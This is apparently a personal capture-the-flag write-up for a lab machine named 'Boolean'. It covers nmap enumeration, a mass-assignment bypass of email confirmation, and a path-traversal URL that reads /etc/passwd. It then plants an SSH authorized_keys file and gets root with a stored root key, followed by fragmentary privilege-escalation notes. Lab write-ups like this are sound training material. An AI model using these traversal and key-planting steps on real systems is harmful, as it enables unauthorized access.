#Pwned! 
```IP
192.168.180.231
```
## Enumeration
## Nmap

As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.180.231 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE  SERVICE REASON         VERSION
22/tcp    open   ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)            
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBCcfKYKMXuTWeyLKlFNHgmebcXbFAjSpbr39R8GFHYRmc/mZXKNgEoa5gkFAVr8kVVul4X6//DcnRuHtrCpHcnTIZLT9g1DPB09VsLzsjT0TpmqkcDYtZazo1mjnBZdaM+AxoDMghZd8AXiNrCl7jCN+vRjUQc8T1wD4PoC02XjeCAI8Yha++Mv9ZrSPZ+/gBv
gZPL3pdQhVGUSUHOmXod4xcdm5ReNiZRNZklOhhscbGfSCqQIdJogegZfMrlueeG3EY7Kkf5CxAUDH/9ir2dEDDifIpqKV8W7ncKEpsZiqgDh36OdMX4LPJ0NmZiT/g8CvINx7k4HWj3ksT+5C7
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)           
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEK0B9iLJQztyEpGiNffHgQuGcxZRO/BOi+r0j/P8Hkz02pIWW2hFrArbzehUNQ46ZmFwMhxxmrIOLBpUt9ZGBw=
|   256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)         
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOAlO2qlRhyMwzzf3xAK4wOGz1UD5t9+QQO5J3QjTkaZ
80/tcp    open   http    syn-ack ttl 61                
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-title: Boolean                       
|_Requested resource was http://192.168.180.231/login
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings:                 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, Termin
alServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
3000/tcp  closed ppp     reset ttl 61
33017/tcp open   http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
```
## SSH
rsa
ecdsa

## HTTP 80
redirects to login page
Other directories
register
we need email confirmation

## HTTP 33017
Development
apache http server??
```
whatweb http://192.168.180.231:33017
```
Apache 2.4.38
## 3000


# Exploitation
we can alter the data by sending parameter confirmed=True
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120115231.png?raw=true)
## LFI
```
http://192.168.180.231/?cwd=../../../../../etc/&file=passwd&download=true
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120122332.png?raw=true)
 we can path traversal to remi ssh directory
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120133539.png?raw=true)
 upload here a public key named authorized_keys created with the following command:
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120133620.png?raw=true)
 and we are in

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120133518.png?raw=true)
# PrivEsc

## Manual
Doesnt seem possible to exploit CVE-2019-13272
https://github.com/jas502n/CVE-2019-13272/tree/master

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120140346.png?raw=true)

we have root keys in .ssh/keys/root
```
ssh root@127.0.0.1 -i .ssh/keys/root
```
we are root
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120173339.png?raw=true)

## Automated

### Peass
active ports
```
127.0.0.1:3306
127.0.0.1:3000          0.0.0.0:*               LISTEN      847/puma 5.6.5 (tcp
```
ptrace protection is disabled (0), so sudo tokens could be abused
useful software
```
/usr/bin/nc.traditional
```
mysql  Ver 15.1 Distrib 10.3.36-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
uncommon password files
```
/etc/pam.d/passwd
/etc/passwd
/usr/share/bash-completion/completions/passwd
/usr/share/lintian/overrides/passwd
```
SUID
```
/usr/bin/chfn  --->  SuSE_9.3/10
```
.sh files in path
```
/usr/bin/gettext.sh
```

ps aux
```
puma 5.6.5 (tcp://127.0.0.1:3000) [boolean]
```
### Mimikatz

# Lateral Movement

